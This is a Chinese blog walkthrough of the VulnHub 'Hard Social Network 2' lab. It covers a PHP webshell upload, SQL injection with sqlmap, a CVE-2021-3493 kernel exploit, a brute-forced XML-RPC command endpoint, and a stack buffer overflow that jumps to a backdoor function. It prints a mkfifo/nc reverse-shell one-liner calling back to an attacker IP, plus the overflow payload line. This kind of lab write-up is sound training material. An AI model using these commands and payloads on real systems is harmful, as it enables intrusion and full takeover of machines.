# 打靶-HardSocialNetwork

<div class="has-toc have-toc">
</div>

## 0x00 准备工作

靶机地址: <a href="https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova</a>  
难度等级: 高  
打靶目标: 取得 root 权限

涉及攻击方法:

主机发现  
端口扫描  
SQL注入  
文件上传  
CVE-2021-3493  
XMLRPC  
逆向工程  
动态调试  
缓冲区溢出  
漏洞利用代码编写

## 0x01 信息搜集

对靶机端口进行扫描。<figure class="wp-block-image size-full">

<img loading="lazy" width="1515" height="885" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-139.png" alt="" class="wp-image-4222" /> </figure> 

访问8000端口时会发现501报错，提示不支持GET请求，用拓展修改请求方式，依旧报错。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-140.png" alt="" class="wp-image-4223" width="564" height="217" /> </figure> 

看看80端口，发现登录需要用邮件的格式。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-142.png" alt="" class="wp-image-4225" width="377" height="361" /> </figure> 

简单注册一个用户。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-143.png" alt="" class="wp-image-4226" width="318" height="383" /> </figure> 

在后台能发现一个疑似管理员的账户，他描述说在系统上运行了有monitor.py。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-144.png" alt="" class="wp-image-4227" width="594" height="471" /> </figure> 

## 0x02 GetShell

发现这个地方可以传文件，试下php一句话木马。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-145.png" alt="" class="wp-image-4229" width="482" height="248" /> </figure> 

直接传上去了，没有任何过滤，那就上蚁剑连接！成功拿到了www-data的权限。<figure class="wp-block-image size-full">

<img loading="lazy" width="1345" height="328" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-146.png" alt="" class="wp-image-4230" /> </figure> 

翻一下目录，database文件夹很可疑，进去后看到两个sql文件，当前用户运行不了mysql。<figure class="wp-block-image size-full">

<img loading="lazy" width="1267" height="557" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-147.png" alt="" class="wp-image-4232" /> </figure> 

把这两个文件下载到本地分析，发现了数据库的部分信息，但没什么用。<figure class="wp-block-image size-full">

<img loading="lazy" width="2332" height="1022" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-148.png" alt="" class="wp-image-4233" /> </figure> 

结合<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-149.png" alt="" class="wp-image-4234" width="230" height="33" /> </figure> 

怀疑存在sql注入，测试后成功验证，上sqlmap一把梭。

bp抓包后，另存为文件r<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-150.png" alt="" class="wp-image-4235" width="466" height="116" /> </figure> 

运行`sqlmap -r r -p id`,接着往下爆破得到管理员的账号密码。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-151.png" alt="" class="wp-image-4237" width="665" height="133" /> </figure> 

但登录admin未发现有价值的信息，这时查看系统内核版本和操作系统版本。<figure class="wp-block-image size-full">

<img loading="lazy" width="1536" height="211" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-153.png" alt="" class="wp-image-4240" /> </figure> 

## 0x03 提升权限

在github上找到CVE-2021-3493的exp<a rel="noreferrer noopener" href="https://github.com/briskets/CVE-2021-3493" target="_blank" rel="nofollow" >https://github.com/briskets/CVE-2021-3493</a>,上传后运行。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-154.png" alt="" class="wp-image-4241" width="533" height="72" /> </figure> 

发现提权是成功的，但因为蚁剑的原因自动退出了，这时试着用nc尝试，但nc上不支持-e参数。一种新的反弹shell方式`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.0.2.4 3333 >/tmp/f`<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-156.png" alt="" class="wp-image-4243" width="584" height="95" /> </figure> 

再通过`python -c "import pty; pty.spawn('/bin/bash')"`实现交互式命令行。<figure class="wp-block-image size-full">

<img loading="lazy" width="1410" height="173" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-157.png" alt="" class="wp-image-4244" /> </figure> 

再运行exploit文件，提权成功。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-158.png" alt="" class="wp-image-4245" width="421" height="102" /> </figure> 

## 0x04 另一种提权方法

继续搜集信息，查看到socnet的可疑用户，跳到他的目录下，发现存在monitor.py文件。<figure class="wp-block-image size-full">

<img loading="lazy" width="1373" height="980" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-159.png" alt="" class="wp-image-4247" /> </figure> 

查看下进程<figure class="wp-block-image size-full">

<img loading="lazy" width="1879" height="171" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-160.png" alt="" class="wp-image-4249" /> </figure> 

查看源代码如下：

```python
#my remote server management API
import SimpleXMLRPCServer
import subprocess
import random

debugging_pass = random.randint(1000,9999)

def runcmd(cmd):
    results = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = results.stdout.read() + results.stderr.read()
    return output

def cpu():
    return runcmd("cat /proc/cpuinfo")

def mem():
    return runcmd("free -m")

def disk():
    return runcmd("df -h")

def net():
    return runcmd("ip a")

def secure_cmd(cmd,passcode):
    if passcode==debugging_pass:
         return runcmd(cmd)
    else:
        return "Wrong passcode."

server = SimpleXMLRPCServer.SimpleXMLRPCServer(("0.0.0.0", 8000))
server.register_function(cpu)
server.register_function(mem)
server.register_function(disk)
server.register_function(net)
server.register_function(secure_cmd)

server.serve_forever()
```

XMLRPCServer的官方说明在<a rel="noreferrer noopener" href="https://docs.python.org/zh-cn/3/library/xmlrpc.html" target="_blank" rel="nofollow" >https://docs.python.org/zh-cn/3/library/xmlrpc.html</a>，可以知道服务端是需要通过XMLRPC的方式来请求。这里在本地构造客户端，用cpu函数进行测试。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-162.png" alt="" class="wp-image-4251" width="487" height="58" /> </figure> 

能够成功执行。<figure class="wp-block-image size-full">

<img loading="lazy" width="1933" height="988" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-161.png" alt="" class="wp-image-4250" /> </figure> 

进一步修改代码，爆破passcode。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-164.png" alt="" class="wp-image-4254" width="359" height="81" /></figure> 

修改命令，反弹shell。<figure class="wp-block-image size-full">

<img loading="lazy" width="1501" height="268" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-165.png" alt="" class="wp-image-4255" /> </figure> 

成功拿到权限。<figure class="wp-block-image size-full">

<img loading="lazy" width="1745" height="316" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-166.png" alt="" class="wp-image-4256" /> </figure> 

查看当前目录下的文件，发现有文件存在root权限，然后文件类型为elf。<figure class="wp-block-image size-full">

<img loading="lazy" width="1917" height="750" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-168.png" alt="" class="wp-image-4258" /> </figure> 

运行文件，依次输入字符串，运行结束后产生新文件，查看内容。共有姓名、工作年限、工资、是否遇到困难、抱怨5处入口点。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-169.png" alt="" class="wp-image-4259" width="412" height="419" /> </figure> 

靶机存在peda，而它是gdb的插件，运行`gdb -q ./add_record`来加载add_record。输入r运行程序。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-170.png" alt="" class="wp-image-4260" width="573" height="161" /> </figure> 

用`python3 -c "print('A'*500)"`生成一系列的A，测试是否存在缓冲区溢出，发现Explain有问题。<figure class="wp-block-image size-full">

<img loading="lazy" width="1926" height="1260" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-171.png" alt="" class="wp-image-4262" /> </figure> 

EIP存放的是下一条要执行的指令地址，所以要计算出第几个字符被填充到EIP。使用`pattern create 100`命令生成100个特征字符串。<figure class="wp-block-image size-full">

<img loading="lazy" width="1641" height="109" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-172.png" alt="" class="wp-image-4263" /> </figure> 

输入后使用`pattern search`找到字符串的位置，可以发现63的位置就是EIP，只要将EIP的下一条地址指向shell命令所在的内存地址，就能提权成功。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-173.png" alt="" class="wp-image-4265" width="575" height="436" /> </figure> 

使用`disas main`命令，查看main函数的汇编代码，发现了vuln的可疑函数。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-174.png" alt="" class="wp-image-4267" width="452" height="237" /> </figure> 

使用`info func`，查看当前程序使用的函数，发现了异常的函数。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-175.png" alt="" class="wp-image-4268" width="324" height="573" /> </figure> 

`disas vuln`查看具体执行了哪些指令，其中`strcpy`函数可能会产生缓冲区溢出。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-178.png" alt="" class="wp-image-4272" width="533" height="363" /> </figure> 

`disas backdoor`查看具体执行了哪些指令，函数调用了`setuid`和`system`函数，尝试执行操作系统的指令。或许可以通过执行backdoor函数达到提权的目的。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-177.png" alt="" class="wp-image-4271" width="533" height="383" /> </figure> 

按q退出后，通过python脚本把起始地址`0x08048676`，写进EIP寄存器。

<pre class="wp-block-code"><code>python -c "import struct;print('1\n1\n1\n1\n' + 'A' * 62 + struct.pack('I', 0x08048676))" > payload</code></pre><figure class="wp-block-image size-full">

<img loading="lazy" width="1772" height="438" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-180.png" alt="" class="wp-image-4275" /> </figure> 

最后执行`cat payload - | ./add_record`，成功提升权限！<figure class="wp-block-image size-full">

<img loading="lazy" width="1667" height="252" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-181.png" alt="" class="wp-image-4276" /> </figure>
